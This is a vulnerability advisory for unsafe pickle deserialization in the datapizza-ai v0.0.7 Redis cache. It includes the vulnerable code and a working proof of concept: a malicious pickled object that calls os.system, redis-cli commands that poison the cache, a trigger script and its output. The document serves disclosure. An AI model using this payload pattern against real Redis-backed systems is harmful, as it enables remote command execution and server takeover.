### Summary

An Unsafe Deserialization via *pickle.loads()* in datapizza-ai Redis cache allows Remote Command Execution on the server host.

### Details

CVSSv3: HIGH 7.9/10 `CVSS:3.1/AV:A/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H`

datapizza-ai version: `v0.0.7`

The vulnerability is caused by the usage of vulnerable functions of pickle serialization library (*datapizza-ai-cache/redis/datapizza/cache/redis/cache.py*, source here <https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.7/datapizza-ai-cache/redis/datapizza/cache/redis/cache.py>).

```python
import pickle
# ...
class RedisCache(Cache):
# ...
    def get(self, key: str) -> str | None:
        """Retrieve and deserialize object"""
        pickled_obj = self.redis.get(key)
        if pickled_obj is None:
            return None
        return pickle.loads(pickled_obj)  # type: ignore

    def set(self, key: str, obj):
        """Serialize and store object"""
        pickled_obj = pickle.dumps(obj)
        self.redis.set(key, pickled_obj, ex=self.expiration_time)
```

### PoC

Installation Steps

```bash
python -m venv .env
source .env/bin/activate
pip install datapizza-ai==0.0.7
pip install datapizza-ai-cache-redis
```

Spin up a Redis server

```console
docker run -d --name redis -p 6379:6379 redis:latest
```

For a simple proof of concept we're using the bytes representation of pickled object below:

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("touch cachepwned",))
```

that is: `\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x10touch cachepwned\x94\x85\x94R\x94.`.

Poison the redis cache with this value:

```bash
127.0.0.1:6379> set poc "\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x10touch cachepwned\x94\x85\x94R\x94."
OK
127.0.0.1:6379> get poc
"\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x10touch cachepwned\x94\x85\x94R\x94."
```

And run the python program below:

```python
from datapizza.cache.redis import RedisCache

def test_redis_cache():
    cache = RedisCache(host="localhost", port=6379, db=0)
    cache.get("poc")

test_redis_cache()
```

Execute the file with `python3 poc.py`

Command injection result (`ls -alh`):

```text
total 16K
-rw-rw-r-- 1 edoardottt edoardottt    0 Oct 15 18:57 cachepwned
-rw-rw-r-- 1 edoardottt edoardottt  778 Oct 15 19:00 notes.txt
-rw-rw-r-- 1 edoardottt edoardottt  826 Oct 14 14:39 poc3-working.py
-rw-rw-r-- 1 edoardottt edoardottt  312 Oct 15 18:51 poc-cache.py
drwxrwxr-x 5 edoardottt edoardottt 4.0K Oct 14 11:53 .venv/
```

### Impact

Usually if attackers can control the redis cache they can subvert the model behavior, for example injecting fake outputs in cached queries.  
In this case, attackers can run arbitrary system commands without any restriction (e.g. they could use a reverse shell and gain access to the server).  
The impact is high as the attacker can completely takeover the server host.  
Here a simple Proof of Concept code snippet is shown, but in reality every feature that uses the `RedisCache` module is potentially vulnerable.

### References

- <https://docs.python.org/3/library/pickle.html>

### Credits

Edoardo Ottavianelli ([@edoardottt](https://github.com/edoardottt))
